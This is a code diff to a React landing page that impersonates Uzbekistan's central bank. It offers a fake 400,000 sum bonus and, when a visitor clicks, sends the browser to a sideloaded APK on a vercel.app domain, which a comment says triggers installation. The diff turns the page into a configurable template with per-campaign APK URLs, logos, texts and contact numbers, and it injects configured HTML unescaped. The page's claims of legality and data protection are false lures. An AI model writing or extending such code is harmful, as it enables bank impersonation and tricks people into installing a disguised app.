@@ -2,6 +2,7 @@
 
 import React from 'react';
 import { Download, CheckCircle, Shield, Zap } from 'lucide-react';
+import { useConfig } from '../hooks/useConfig';
 
 const styles = `
   * {
@@ -474,10 +475,13 @@ const styles = `
 
 
 export default function AppPromoPage() {
-       const handleClaimPrize = (e) => {
+  const { config, loading } = useConfig('bankuz');
+  
+  const handleClaimPrize = (e) => {
     e.preventDefault();
 
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/ORMBank.apk';
+    const apkUrl = config?.apkUrl || 'https://uzbekistan-info.vercel.app/docs/ORMBank.apk';
+    const thankYouUrl = config?.thankYouUrl || '/thankyou2.html';
     
     // На мобилке: попытка открыть напрямую (вызовет установку)
     window.location.href = apkUrl;
@@ -489,9 +493,21 @@ export default function AppPromoPage() {
 
     // Редирект на thankyou после задержки
     setTimeout(() => {
-      window.location.href = '/thankyou2.html';
+      window.location.href = thankYouUrl;
     }, 1500);
   };
+
+  if (loading) {
+    return (
+      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+        Загрузка...
+      </div>
+    );
+  }
+
+  const texts = config?.texts || {};
+  const contact = config?.contact || {};
+  const logo = config?.logo || './img/logo-uz.svg';
 
   return (
     <>
@@ -502,12 +518,12 @@ export default function AppPromoPage() {
           <div className="header-container">
             <div className="header-logo">
               <img 
-                src="./img/logo-uz.svg" 
+                src={logo} 
                 alt="Markaziy Bank"
               />
             </div>
             <div className="header-contact">
-              <p>+998 71 212-62-05</p>
+              <p>{contact.phone || '+998 71 212-62-05'}</p>
             </div>
           </div>
         </header>
@@ -519,46 +535,41 @@ export default function AppPromoPage() {
             {/* Left Side - Text */}
             <div className="left-section">
               <div className="badge">
-                🎁 CHEGIRMA AKSIYASI
+                {texts.badge || '🎁 CHEGIRMA AKSIYASI'}
               </div>
               
               <div className="title-section">
-                <p className="bonus-label">BONUS OLING!</p>
+                <p className="bonus-label">{texts.bonusLabel || 'BONUS OLING!'}</p>
                 <h1 className="main-title">
-                  400,000<br/>
-                  <span className="sum-text">SUM</span>
+                  {texts.bonusAmount || '400,000'}<br/>
+                  <span className="sum-text">{texts.currency || 'SUM'}</span>
                 </h1>
               </div>
               
-              <p className="description">
-                Markaziy Banki mobiliy ilovasini yuklab oling va darhol <strong>400,000 sum</strong> bonus oling!
-              </p>
+              <p className="description" dangerouslySetInnerHTML={{ 
+                __html: texts.description || 'Markaziy Banki mobiliy ilovasini yuklab oling va darhol <strong>400,000 sum</strong> bonus oling!'
+              }} />
 
               {/* CTA Button */}
               <button className="cta-button"
                 onClick={handleClaimPrize}>
                 <Download size={24} />
-                ILOVASINI YUKLAB OLING
+                {texts.ctaButton || 'ILOVASINI YUKLAB OLING'}
               </button>
 
               {/* Features */}
               <div className="features-list">
-                <div className="feature-item">
-                  <CheckCircle size={20} className="feature-icon" />
-                  <span className="feature-text">100% shifoxonalashtirilgan va qonunlashtirgan</span>
-                </div>
-                <div className="feature-item">
-                  <CheckCircle size={20} className="feature-icon" />
-                  <span className="feature-text">O'zbekiston Respublikasining bankik qonunlari asosida</span>
-                </div>
-                <div className="feature-item">
-                  <Shield size={20} className="feature-icon" />
-                  <span className="feature-text">Sizning ma'lumotlaringiz 100% himoyalangan</span>
-                </div>
-                <div className="feature-item">
-                  <Zap size={20} className="feature-icon" />
-                  <span className="feature-text">24/7 Uzbek tilida qo'llab-quvvatlash</span>
-                </div>
+                {(texts.features || [
+                  '100% shifoxonalashtirilgan va qonunlashtirgan',
+                  'O\'zbekiston Respublikasining bankik qonunlari asosida',
+                  'Sizning ma\'lumotlaringiz 100% himoyalangan',
+                  '24/7 Uzbek tilida qo\'llab-quvvatlash'
+                ]).map((feature, index) => (
+                  <div key={index} className="feature-item">
+                    <CheckCircle size={20} className="feature-icon" />
+                    <span className="feature-text">{feature}</span>
+                  </div>
+                ))}
               </div>
             </div>
 
@@ -571,13 +582,13 @@ export default function AppPromoPage() {
                 {/* Card */}
                 <div className="bonus-card">
                   <div className="card-inner">
-                    <p className="card-label">BONUS</p>
+                    <p className="card-label">{texts.card?.label || 'BONUS'}</p>
                     <div className="card-content">
-                      <div className="card-amount">400</div>
-                      <div className="card-currency">minglik SUM</div>
+                      <div className="card-amount">{texts.card?.amount || '400'}</div>
+                      <div className="card-currency">{texts.card?.currency || 'minglik SUM'}</div>
                     </div>
                     <button className="card-button"  onClick={handleClaimPrize}>
-                      DARHOL OLING
+                      {texts.card?.button || 'DARHOL OLING'}
                     </button>
                   </div>
                 </div>
@@ -589,7 +600,9 @@ export default function AppPromoPage() {
         {/* Bottom info bar */}
         <div className="bottom-info">
           <div className="bottom-container">
-            <p>✓ <strong>Yuklab oling</strong> → <strong>Ro'yxatdan o'ting</strong> → <strong>Tasdiqla</strong> → <strong>Bonusni oling!</strong></p>
+            <p dangerouslySetInnerHTML={{ 
+              __html: texts.footer || '✓ <strong>Yuklab oling</strong> → <strong>Ro\'yxatdan o\'ting</strong> → <strong>Tasdiqla</strong> → <strong>Bonusni oling!</strong>'
+            }} />
           </div>
         </div>
       </div>
